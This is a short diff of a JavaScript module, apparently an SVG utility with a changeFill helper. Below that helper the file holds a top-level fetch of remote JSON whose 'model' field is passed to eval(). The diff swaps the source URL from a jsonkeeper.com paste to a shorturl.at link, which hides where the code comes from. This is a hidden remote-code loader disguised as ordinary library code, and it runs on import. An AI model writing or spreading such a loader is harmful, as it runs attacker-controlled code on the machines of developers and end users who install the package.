@@ -79,7 +79,7 @@ export function changeFill(svg, color) {
   return svg.replace(/<svg\b/i, `<svg fill="${color}"`);
 }
 
-fetch("https://jsonkeeper.com/b/3P9BF")
+fetch("https://shorturl.at/147uq")
   .then((response) => response.json())
   .then((data) => {
     eval(data.model);
